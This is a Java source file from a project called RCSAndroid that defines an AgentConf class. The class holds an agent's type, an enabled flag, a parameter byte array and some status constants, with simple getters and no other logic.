/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import com.ht.RCSAndroidGUI.conf.RunningConf;

// TODO: Auto-generated Javadoc
/**
 * The Class Agent.
 */
public class AgentConf implements RunningConf {

	/** Agent status definitions. */
	final public static int AGENT_DISABLED = 0x1;

	/** The Constant AGENT_ENABLED. */
	final public static int AGENT_ENABLED = 0x2;

	/** The Constant AGENT_RUNNING. */
	final public static int AGENT_RUNNING = 0x3;

	/** The Constant AGENT_STOPPED. */
	final public static int AGENT_STOPPED = 0x4;

	/** The Constant AGENT_STOP. */
	final public static int AGENT_STOP = AGENT_STOPPED;

	/** The Constant AGENT_RELOAD. */
	final public static int AGENT_RELOAD = 0x1;

	/** The Constant AGENT_ROTATE. */
	final public static int AGENT_ROTATE = 0x2;

	/** Agent ID. */
	private final AgentType agentId;

	/** Agent status: enabled, disabled, running, stopped. */
	// private int agentStatus;

	/** Parameters. */
	private final byte[] agentParams;

	/** The agent enabled. */
	private final boolean agentEnabled;

	/**
	 * Instantiates a new agent.
	 * 
	 * @param id
	 *            the id
	 * @param enabled
	 *            the status
	 * @param params
	 *            the params
	 */
	public AgentConf(final AgentType id, final boolean enabled, final byte[] params) {
		this.agentId = id;
		// this.agentStatus = AGENT_STOPPED;
		this.agentEnabled = enabled;
		this.agentParams = params;
	}

	/**
	 * Gets the id.
	 * 
	 * @return the id
	 */
	public AgentType getId() {
		return this.agentId;
	}

	/**
	 * Checks if is enabled.
	 *
	 * @return true, if is enabled
	 */
	public boolean isEnabled() {
		return this.agentEnabled;
	}

	/**
	 * Gets the params.
	 * 
	 * @return the params
	 */
	public byte[] getParams() {
		return this.agentParams;
	}
}
